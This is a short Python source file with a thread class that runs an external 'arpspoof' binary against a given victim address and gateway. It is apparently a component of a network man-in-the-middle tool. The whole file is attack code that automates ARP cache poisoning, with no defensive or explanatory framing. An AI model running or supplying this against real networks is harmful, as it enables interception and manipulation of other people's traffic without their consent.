from subprocess import DEVNULL
from subprocess import STDOUT
from subprocess import Popen
from threading import Thread


class ArpSpoofThread(Thread):
    def __init__(self, victim, gateway, working_interface=None):
        Thread.__init__(self)
        self.victim = victim
        self.gateway = gateway
        self.working_interface = working_interface
        self.process = None
        self.terminated = False

    def run(self):
        self.process = Popen(["./arpspoof", "-i", self.working_interface, "-t", self.victim, self.gateway],
                             stdout=DEVNULL, stderr=STDOUT)
        self.process.wait()

    def stop(self):
        self.terminated = True
        self.process.terminate()
